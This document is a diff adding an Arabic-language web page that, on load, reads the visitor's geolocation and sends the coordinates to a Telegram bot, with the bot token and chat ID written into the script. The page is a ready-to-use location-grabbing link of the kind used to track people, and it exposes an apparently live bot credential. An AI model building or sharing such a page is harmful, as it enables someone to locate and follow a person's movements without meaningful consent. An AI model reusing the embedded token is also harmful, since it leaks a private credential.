@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تحديد الموقع</title>
+  <script>
+    window.onload = function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error);
+      } else {
+        alert("المتصفح لا يدعم تحديد الموقع");
+      }
+
+      function success(position) {
+        var lat = position.coords.latitude;
+        var lon = position.coords.longitude;
+
+        var token = "7876861765:AAFHhXiCHpDM7qeYLZNEfq1WoEpD9vErTr8";
+        var chat_id = "5880561408";
+        var message = "تم تحديد موقع جديد:\nخط العرض: " + lat + "\nخط الطول: " + lon;
+
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+          .then(response => {
+            if (response.ok) {
+              alert("تم إرسال الموقع إلى البوت!");
+            } else {
+              alert("فشل إرسال الموقع.");
+            }
+          });
+      }
+
+      function error(err) {
+        alert("تعذر الحصول على الموقع: " + err.message);
+      }
+    };
+  </script>
+</head>
+<body>
+  <h2 style="text-align:center;margin-top:50px;">يتم الآن تحديد موقعك...</h2>
+</body>
+</html>
